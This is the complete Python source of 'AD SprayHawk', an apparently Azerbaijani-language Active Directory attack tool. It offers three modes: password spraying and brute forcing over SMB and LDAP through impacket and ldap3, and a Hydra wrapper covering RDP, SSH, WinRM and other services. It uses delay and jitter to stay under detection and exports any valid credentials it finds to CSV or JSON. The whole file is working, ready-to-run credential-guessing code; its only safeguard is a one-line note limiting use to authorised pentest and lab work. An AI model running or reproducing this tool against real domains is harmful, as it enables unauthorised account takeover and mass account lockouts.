#!/usr/bin/env python3
"""
AD SprayHawk — Multi-Mode Attack Engine
Rejimler: --ps (Password Spray) --bf (Brute Force) --hbf (Hydra Brute Force)
YALNIZ icazeli pentest/CTF/lab muhitlerinde istifade ucun.
"""

import argparse
import csv
import json
import re
import shutil
import subprocess
import sys
import time
import random
import socket
from datetime import datetime

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import (
    Progress, BarColumn, TextColumn, TimeElapsedColumn,
    TimeRemainingColumn, SpinnerColumn, MofNCompleteColumn,
)
from rich.live import Live
from rich.text import Text
from rich.align import Align
from rich.rule import Rule
from rich import box

try:
    from impacket.smbconnection import SMBConnection
    from impacket.smbconnection import SessionError as SMBSessionError
except ImportError:
    SMBConnection = None
    SMBSessionError = Exception

try:
    from ldap3 import Server, Connection, ALL, NTLM
    from ldap3.core.exceptions import LDAPBindError, LDAPSocketOpenError
except ImportError:
    Server = None

console = Console()

BANNER = r"""
[bold cyan]   _____ ____  ____  ___ __  ___ __ __ ___    _       __
  / ___// __ \/ __ \/   /  |/  // // // //   |  |     / /
  \__ \/ /_/ / /_/ / /| /|_/ // //_// // //| |  | /| / / 
 ___/ / ____/ _, _/ ___ /  / // __  // // ___ |  |/ |/ /  
/____/_/   /_/ |_/_/  |_|  /_/_/ /_/_/_//_/  |_|  |__/[/bold cyan]
[dim]     Multi-Mode Active Directory Attack Engine  |  v3.0[/dim]
[dim]        Modes:  --ps (Spray)  --bf (Brute)  --hbf (Hydra)[/dim]
"""

MODE_INFO = {
    "ps":  {"name": "PASSWORD SPRAY",  "color": "green",  "risk": "ASAGI"},
    "bf":  {"name": "BRUTE FORCE",     "color": "red",    "risk": "YUKSEK"},
    "hbf": {"name": "HYDRA BRUTE FORCE", "color": "magenta", "risk": "YUKSEK (hydra suretine bagli)"},
}


def load_lines(path):
    items = []
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    items.append(line)
    except FileNotFoundError:
        console.print(f"[bold red][-] Fayl tapilmadi: {path}[/bold red]")
        sys.exit(1)
    return items


def export_results(path, valid_creds, locked_accounts, disabled_accounts):
    if path.endswith(".json"):
        data = {
            "generated_at": datetime.now().isoformat(),
            "valid_credentials": [{"username": u, "password": p, "protocol": pr} for u, p, pr in valid_creds],
            "locked_accounts": locked_accounts,
            "disabled_accounts": disabled_accounts,
        }
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
    else:
        with open(path, "w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["username", "password", "protocol", "status"])
            for u, p, pr in valid_creds:
                writer.writerow([u, p, pr, "VALID"])
            for u in locked_accounts:
                writer.writerow([u, "", "", "LOCKED"])
            for u in disabled_accounts:
                writer.writerow([u, "", "", "DISABLED"])
    console.print(f"[bold green][+] Neticeler fayla yazildi: {path}[/bold green]")


def try_smb_login(dc_ip, domain, username, password, timeout=5):
    if SMBConnection is None:
        return "error", "impacket quraşdırılmayıb"
    try:
        conn = SMBConnection(dc_ip, dc_ip, timeout=timeout)
        conn.login(username, password, domain)
        conn.logoff()
        return "success", None
    except SMBSessionError as e:
        err = str(e)
        if "STATUS_LOGON_FAILURE" in err:
            return "fail", "Yanlis parol"
        elif "STATUS_ACCOUNT_LOCKED_OUT" in err:
            return "locked", "Hesab kilidlenib"
        elif "STATUS_ACCOUNT_DISABLED" in err:
            return "disabled", "Hesab deaktivdir"
        elif "STATUS_PASSWORD_EXPIRED" in err or "STATUS_PASSWORD_MUST_CHANGE" in err:
            return "success", "Parol deyisdirilmelidir (etibarlidir!)"
        elif "STATUS_ACCOUNT_RESTRICTION" in err:
            return "fail", "Hesab mehdudiyyeti"
        else:
            return "error", err
    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        return "error", f"Baglanti xetasi: {e}"
    except Exception as e:
        return "error", str(e)


def try_ldap_login(dc_ip, domain, username, password, timeout=5):
    if Server is None:
        return "error", "ldap3 quraşdırılmayıb"
    try:
        server = Server(dc_ip, get_info=ALL, connect_timeout=timeout)
        upn = f"{username}@{domain}"
        conn = Connection(server, user=upn, password=password, authentication=NTLM)
        if conn.bind():
            conn.unbind()
            return "success", None
        result = conn.result.get("description", "") if conn.result else ""
        if "invalidCredentials" in str(result):
            return "fail", "Yanlis parol"
        return "fail", str(result)
    except LDAPBindError as e:
        return "fail", str(e)
    except LDAPSocketOpenError as e:
        return "error", f"Baglanti xetasi: {e}"
    except Exception as e:
        return "error", str(e)


PROTOCOL_HANDLERS = {"SMB": try_smb_login, "LDAP": try_ldap_login}


def make_stats_panel(stats):
    table = Table.grid(padding=(0, 2))
    table.add_column(justify="right", style="bold")
    table.add_column()
    table.add_row("[cyan]Cehdler:[/cyan]", f"{stats['attempts']}/{stats['total']}")
    table.add_row("[green]Kecerli:[/green]", f"{stats['valid']}")
    table.add_row("[yellow]Kilidli:[/yellow]", f"{stats['locked']}")
    table.add_row("[magenta]Deaktiv:[/magenta]", f"{stats['disabled']}")
    table.add_row("[red]Xeta:[/red]", f"{stats['errors']}")
    table.add_row("[blue]Suret:[/blue]", f"{stats['rate']:.1f} cehd/san")
    return Panel(table, title="[bold]Canli Statistika[/bold]", border_style="cyan", box=box.ROUNDED)


def make_findings_panel(valid_creds):
    if not valid_creds:
        return Panel(
            Align.center(Text("Hele ki hec ne tapilmadi...", style="dim italic")),
            title="[bold]Tapintilar[/bold]", border_style="dim", box=box.ROUNDED,
        )
    table = Table(box=box.SIMPLE_HEAVY, show_header=True, header_style="bold green")
    table.add_column("Istifadeci")
    table.add_column("Parol")
    table.add_column("Protokol")
    for u, p, pr in valid_creds[-8:]:
        table.add_row(u, p, pr)
    return Panel(table, title="[bold]Tapintilar[/bold]", border_style="green", box=box.ROUNDED)


def print_final_summary(valid_creds, locked_accounts, disabled_accounts, stats, start_time):
    elapsed = time.time() - start_time
    console.print()
    console.print(Rule("[bold cyan]NETICE XULASESI[/bold cyan]", style="cyan"))

    summary_table = Table(box=box.ROUNDED, show_header=True, header_style="bold white on blue")
    summary_table.add_column("Metrika", style="bold")
    summary_table.add_column("Deyer", justify="right")
    summary_table.add_row("Umumi vaxt", f"{elapsed:.1f} saniye")
    summary_table.add_row("Umumi cehd", str(stats["attempts"]))
    summary_table.add_row("Orta suret", f"{stats['rate']:.2f} cehd/san")
    summary_table.add_row("Kecerli melumat", f"[bold green]{len(valid_creds)}[/bold green]")
    summary_table.add_row("Kilidli hesab", f"[yellow]{len(locked_accounts)}[/yellow]")
    summary_table.add_row("Deaktiv hesab", f"[magenta]{len(disabled_accounts)}[/magenta]")
    console.print(summary_table)

    if valid_creds:
        console.print()
        creds_table = Table(title="Tapilan Kecerli Melumatlar", box=box.DOUBLE_EDGE,
                             show_header=True, header_style="bold black on green")
        creds_table.add_column("Istifadeci")
        creds_table.add_column("Parol")
        creds_table.add_column("Protokol")
        for u, p, pr in valid_creds:
            creds_table.add_row(u, p, pr)
        console.print(creds_table)
    else:
        console.print("[bold red]Hec bir kecerli melumat tapilmadi.[/bold red]")

    if locked_accounts:
        console.print(f"\n[yellow]Kilidli hesablar:[/yellow] {', '.join(locked_accounts[:10])}"
                       + (" ..." if len(locked_accounts) > 10 else ""))
    if disabled_accounts:
        console.print(f"[magenta]Deaktiv hesablar:[/magenta] {', '.join(disabled_accounts[:10])}"
                       + (" ..." if len(disabled_accounts) > 10 else ""))


def run_password_spray(args, protocols):
    users = load_lines(args.userlist)
    passwords = [args.password] if args.password else load_lines(args.passwordlist)
    total_attempts = len(users) * len(passwords) * len(protocols)

    console.print(Panel.fit(
        f"[bold]Istifadeciler:[/bold] {len(users)}   [bold]Parollar:[/bold] {len(passwords)}   "
        f"[bold]Protokollar:[/bold] {', '.join(protocols)}   [bold]Umumi cehd:[/bold] {total_attempts}",
        title="[bold cyan]Sorgu Parametrleri[/bold cyan]", border_style="blue",
    ))
    if len(passwords) > 1:
        console.print("[bold yellow]Diqqet: Birden cox parol! Lockout policy-ni yoxlamadan davam etme.[/bold yellow]")

    valid_creds, locked_accounts, disabled_accounts = [], [], []
    stats = {"attempts": 0, "total": total_attempts, "valid": 0, "locked": 0, "disabled": 0, "errors": 0, "rate": 0.0}
    start_time = time.time()

    progress = Progress(
        SpinnerColumn(style="cyan"), TextColumn("[bold blue]{task.description}"),
        BarColumn(bar_width=40, complete_style="green", finished_style="bold green"),
        MofNCompleteColumn(), TextColumn("*"), TimeElapsedColumn(), TextColumn("*"), TimeRemainingColumn(),
    )
    task = progress.add_task("Spray davam edir...", total=total_attempts)

    with Live(console=console, refresh_per_second=6) as live:
        def render():
            grid = Table.grid(expand=True)
            grid.add_row(Panel(progress, border_style="blue", box=box.ROUNDED, title="[bold]Ireliyeyis[/bold]"))
            cols = Table.grid(expand=True)
            cols.add_column(ratio=1); cols.add_column(ratio=2)
            cols.add_row(make_stats_panel(stats), make_findings_panel(valid_creds))
            grid.add_row(cols)
            return grid

        live.update(render())

        for pwd_idx, password in enumerate(passwords, start=1):
            for username in users:
                for protocol in protocols:
                    status, detail = PROTOCOL_HANDLERS[protocol](args.dc, args.domain, username, password)
                    stats["attempts"] += 1
                    elapsed = time.time() - start_time
                    stats["rate"] = stats["attempts"] / elapsed if elapsed > 0 else 0

                    if status == "success":
                        valid_creds.append((username, password, protocol)); stats["valid"] += 1
                    elif status == "locked":
                        if username not in locked_accounts: locked_accounts.append(username)
                        stats["locked"] += 1
                    elif status == "disabled":
                        if username not in disabled_accounts: disabled_accounts.append(username)
                        stats["disabled"] += 1
                    elif status == "error":
                        stats["errors"] += 1

                    progress.update(task, advance=1)
                    live.update(render())

                    if status == "success" and args.stop_on_success:
                        progress.update(task, completed=total_attempts)
                        live.update(render())
                        print_final_summary(valid_creds, locked_accounts, disabled_accounts, stats, start_time)
                        if args.output:
                            export_results(args.output, valid_creds, locked_accounts, disabled_accounts)
                        return

                    time.sleep(args.delay + random.uniform(0, args.jitter))

            if args.reset_wait and pwd_idx < len(passwords):
                console.print(f"[dim]Novbeti parola kecmeden evvel {args.reset_wait}s gozlenilir...[/dim]")
                time.sleep(args.reset_wait)

    print_final_summary(valid_creds, locked_accounts, disabled_accounts, stats, start_time)
    if args.output:
        export_results(args.output, valid_creds, locked_accounts, disabled_accounts)


def run_brute_force(args, protocols):
    if not args.username:
        console.print("[bold red][-] --bf rejimi ucun -u/--username teleb olunur.[/bold red]")
        sys.exit(1)

    passwords = load_lines(args.passwordlist)
    total_attempts = len(passwords) * len(protocols)

    console.print(Panel.fit(
        f"[bold]Heder istifadeci:[/bold] {args.username}   [bold]Parollar:[/bold] {len(passwords)}   "
        f"[bold]Lockout threshold:[/bold] {args.lockout_threshold or 'Namelum (DIQQETLI OL)'}",
        title="[bold red]BRUTE FORCE - Yuksek Lockout Riski[/bold red]", border_style="red",
    ))

    if not args.lockout_threshold:
        console.print(
            "[bold yellow]Diqqet: --lockout-threshold verilmeyib. Real AD-de bu, hesabi kilidleye biler.[/bold yellow]"
        )

    valid_creds, locked_accounts, disabled_accounts = [], [], []
    stats = {"attempts": 0, "total": total_attempts, "valid": 0, "locked": 0, "disabled": 0, "errors": 0, "rate": 0.0}
    start_time = time.time()
    consecutive_fails = 0

    progress = Progress(
        SpinnerColumn(style="red"), TextColumn("[bold red]{task.description}"),
        BarColumn(bar_width=40, complete_style="red", finished_style="bold red"),
        MofNCompleteColumn(), TextColumn("*"), TimeElapsedColumn(), TextColumn("*"), TimeRemainingColumn(),
    )
    task = progress.add_task(f"Brute-force: {args.username}", total=total_attempts)

    with Live(console=console, refresh_per_second=6) as live:
        def render():
            grid = Table.grid(expand=True)
            grid.add_row(Panel(progress, border_style="red", box=box.ROUNDED, title="[bold]Ireliyeyis[/bold]"))
            cols = Table.grid(expand=True)
            cols.add_column(ratio=1); cols.add_column(ratio=2)
            cols.add_row(make_stats_panel(stats), make_findings_panel(valid_creds))
            grid.add_row(cols)
            return grid

        live.update(render())

        for password in passwords:
            for protocol in protocols:
                status, detail = PROTOCOL_HANDLERS[protocol](args.dc, args.domain, args.username, password)
                stats["attempts"] += 1
                elapsed = time.time() - start_time
                stats["rate"] = stats["attempts"] / elapsed if elapsed > 0 else 0

                if status == "success":
                    valid_creds.append((args.username, password, protocol)); stats["valid"] += 1
                    consecutive_fails = 0
                elif status == "locked":
                    locked_accounts.append(args.username); stats["locked"] += 1
                    progress.update(task, completed=total_attempts)
                    live.update(render())
                    console.print("[bold red]HESAB KILIDLENDI - dayandirilir.[/bold red]")
                    print_final_summary(valid_creds, locked_accounts, disabled_accounts, stats, start_time)
                    if args.output:
                        export_results(args.output, valid_creds, locked_accounts, disabled_accounts)
                    return
                elif status == "disabled":
                    disabled_accounts.append(args.username); stats["disabled"] += 1
                elif status == "error":
                    stats["errors"] += 1
                else:
                    consecutive_fails += 1

                progress.update(task, advance=1)
                live.update(render())

                if args.lockout_threshold and consecutive_fails >= (args.lockout_threshold - 1):
                    progress.update(task, completed=total_attempts)
                    live.update(render())
                    console.print(
                        f"[bold yellow]Lockout threshold-a yaxinlasildi "
                        f"({consecutive_fails}/{args.lockout_threshold}) - avtomatik dayandirilir.[/bold yellow]"
                    )
                    print_final_summary(valid_creds, locked_accounts, disabled_accounts, stats, start_time)
                    if args.output:
                        export_results(args.output, valid_creds, locked_accounts, disabled_accounts)
                    return

                if status == "success" and args.stop_on_success:
                    progress.update(task, completed=total_attempts)
                    live.update(render())
                    print_final_summary(valid_creds, locked_accounts, disabled_accounts, stats, start_time)
                    if args.output:
                        export_results(args.output, valid_creds, locked_accounts, disabled_accounts)
                    return

                time.sleep(args.delay + random.uniform(0, args.jitter))

    print_final_summary(valid_creds, locked_accounts, disabled_accounts, stats, start_time)
    if args.output:
        export_results(args.output, valid_creds, locked_accounts, disabled_accounts)


HYDRA_SERVICES = ["smb", "ldap", "ldap2", "rdp", "ssh", "ftp", "mssql", "winrm"]
HYDRA_LINE_RE = re.compile(
    r"\[(?P<port>\d+)\]\[(?P<service>[\w-]+)\]\s+host:\s+(?P<host>\S+)\s+login:\s+(?P<login>\S+)\s+password:\s+(?P<password>\S+)"
)
# Verbose (-V) reji minde her cehd sitiri: [ATTEMPT] target X - login "u" - pass "p" - N of TOTAL ...
HYDRA_ATTEMPT_RE = re.compile(r"\[ATTEMPT\].*?-\s*(\d+)\s+of\s+(\d+)")
# Verbose olmadiqda umumi cehd sayi: [DATA] ... N login tries
HYDRA_TOTAL_TRIES_RE = re.compile(r"(\d+)\s+login\s+tries")


def run_hydra_brute_force(args):
    hydra_path = shutil.which("hydra")
    if not hydra_path:
        console.print("[bold red][-] 'hydra' tapilmadi. Qurasdir: sudo apt install hydra[/bold red]")
        sys.exit(1)

    users = load_lines(args.userlist)
    passwords = [args.password] if args.password else load_lines(args.passwordlist)

    console.print(Panel.fit(
        f"[bold]Servis:[/bold] {args.service}   [bold]Istifadeciler:[/bold] {len(users)}   "
        f"[bold]Parollar:[/bold] {len(passwords)}   [bold]Heder:[/bold] {args.dc}",
        title="[bold magenta]Hydra Brute Force[/bold magenta]", border_style="magenta",
    ))

    cmd = [hydra_path, "-L", args.userlist]
    if args.password:
        cmd += ["-p", args.password]
    else:
        cmd += ["-P", args.passwordlist]

    cmd += ["-t", str(args.threads), "-W", str(int(args.delay)) if args.delay else "1"]
    if args.verbose:
        cmd.append("-V")
    cmd += [args.dc, args.service]

    console.print(f"[dim]Icra olunan emr: {' '.join(cmd)}[/dim]\n")

    valid_creds = []
    stats = {"attempts": 0, "total": len(users) * len(passwords), "valid": 0,
             "locked": 0, "disabled": 0, "errors": 0, "rate": 0.0}
    start_time = time.time()

    try:
        process = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1, universal_newlines=True,
        )
    except FileNotFoundError:
        console.print("[bold red][-] Hydra icra edile bilmedi.[/bold red]")
        sys.exit(1)

    console.print(Rule("[bold magenta]Hydra Canli Cixisi[/bold magenta]", style="magenta"))
    for line in process.stdout:
        line = line.rstrip()
        if not line:
            continue
        match = HYDRA_LINE_RE.search(line)
        attempt_match = HYDRA_ATTEMPT_RE.search(line)
        total_match = HYDRA_TOTAL_TRIES_RE.search(line)

        if match:
            login = match.group("login")
            password = match.group("password")
            service = match.group("service")
            valid_creds.append((login, password, service.upper()))
            stats["valid"] += 1
            console.print(f"[bold green]  TAPILDI: {login}:{password} ({service})[/bold green]")
        elif attempt_match:
            # Verbose (-V) rejimi: her setirde N of TOTAL gorunur, cari sayi gotururuk
            stats["attempts"] = int(attempt_match.group(1))
            console.print(f"[dim]{line}[/dim]")
        elif total_match and stats["attempts"] == 0:
            # Verbose olmadiqda: ilk defe umumi cehd sayini [DATA] setirinden oxu,
            # sonda hamisi tamamlandigi ucun total-a beraber olur
            stats["total"] = int(total_match.group(1))
            console.print(f"[dim]{line}[/dim]")
        else:
            console.print(f"[dim]{line}[/dim]")

    # Hydra -V olmadan isleyibse, "N of N" gormemisik - butun cehdler tamamlandigi
    # ucun (proses bitib) attempts = total qeyd edirik.
    if stats["attempts"] == 0 and stats["total"] > 0:
        stats["attempts"] = stats["total"]

    process.wait()
    elapsed = time.time() - start_time
    stats["rate"] = stats["attempts"] / elapsed if elapsed > 0 else 0

    console.print(Rule(style="magenta"))
    print_final_summary(valid_creds, [], [], stats, start_time)
    if args.output:
        export_results(args.output, valid_creds, [], [])


def main():
    parser = argparse.ArgumentParser(
        description="AD SprayHawk - Multi-Mode Attack Engine",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )

    mode_group = parser.add_mutually_exclusive_group(required=True)
    mode_group.add_argument("--ps", action="store_true", help="Password Spray rejimi (lockout-safe)")
    mode_group.add_argument("--bf", action="store_true", help="Klassik Brute Force rejimi (1 istifadeci)")
    mode_group.add_argument("--hbf", action="store_true", help="Hydra Brute Force rejimi (hydra wrapper)")

    parser.add_argument("-d", "--domain", required=True, help="Domain adi")
    parser.add_argument("--dc", required=True, help="Domain Controller IP")

    parser.add_argument("-U", "--userlist", help="Istifadeci adlari fayli")
    parser.add_argument("-u", "--username", help="Tek heder istifadeci (--bf ucun)")

    parser.add_argument("-P", "--passwordlist", help="Parol siyahisi fayli")
    parser.add_argument("-p", "--password", help="Tek parol")

    parser.add_argument("--smb", action="store_true", help="SMB uzerinden test et")
    parser.add_argument("--ldap", action="store_true", help="LDAP uzerinden test et")
    parser.add_argument("--service", choices=HYDRA_SERVICES, default="smb", help="Hydra servis adi")
    parser.add_argument("--threads", type=int, default=4, help="Hydra thread sayi")

    parser.add_argument("--delay", type=float, default=1.0, help="Cehdler arasi minimum gecikme (san)")
    parser.add_argument("--jitter", type=float, default=0.5, help="Elave tesaduf gecikme (san)")
    parser.add_argument("--reset-wait", type=int, default=0, help="Parol dovrleri arasi gozleme")
    parser.add_argument("--lockout-threshold", type=int, help="AD lockout threshold")
    parser.add_argument("--stop-on-success", action="store_true", help="Ilk tapintidan sonra dayan")
    parser.add_argument("-o", "--output", help="Neticeleri fayla yaz (.csv/.json)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Butun cehdleri goster")

    args = parser.parse_args()

    protocols = []
    if args.smb: protocols.append("SMB")
    if args.ldap: protocols.append("LDAP")

    console.print(BANNER)
    console.print(Rule(style="cyan"))

    if args.ps:
        mode = "ps"
        if not protocols:
            console.print("[bold red]--ps ucun --smb ve/ya --ldap sec[/bold red]"); sys.exit(1)
        if not args.userlist:
            console.print("[bold red]--ps ucun -U/--userlist teleb olunur[/bold red]"); sys.exit(1)
    elif args.bf:
        mode = "bf"
        if not protocols:
            console.print("[bold red]--bf ucun --smb ve/ya --ldap sec[/bold red]"); sys.exit(1)
        if not args.passwordlist:
            console.print("[bold red]--bf ucun -P/--passwordlist teleb olunur[/bold red]"); sys.exit(1)
    else:
        mode = "hbf"
        if not args.userlist:
            console.print("[bold red]--hbf ucun -U/--userlist teleb olunur[/bold red]"); sys.exit(1)

    info = MODE_INFO[mode]
    console.print(
        f"[bold {info['color']}]REJIM: {info['name']}[/bold {info['color']}]   "
        f"[bold]Risk seviyyesi:[/bold] {info['risk']}   "
        f"[bold]Heder DC:[/bold] {args.dc}   [bold]Domain:[/bold] {args.domain}"
    )
    console.print(Rule(style="cyan"))
    console.print()

    try:
        if mode == "ps":
            run_password_spray(args, protocols)
        elif mode == "bf":
            run_brute_force(args, protocols)
        else:
            run_hydra_brute_force(args)
    except KeyboardInterrupt:
        console.print("\n[bold yellow]Istifadeci terefinden dayandirildi.[/bold yellow]")
        sys.exit(0)


if __name__ == "__main__":
    main()
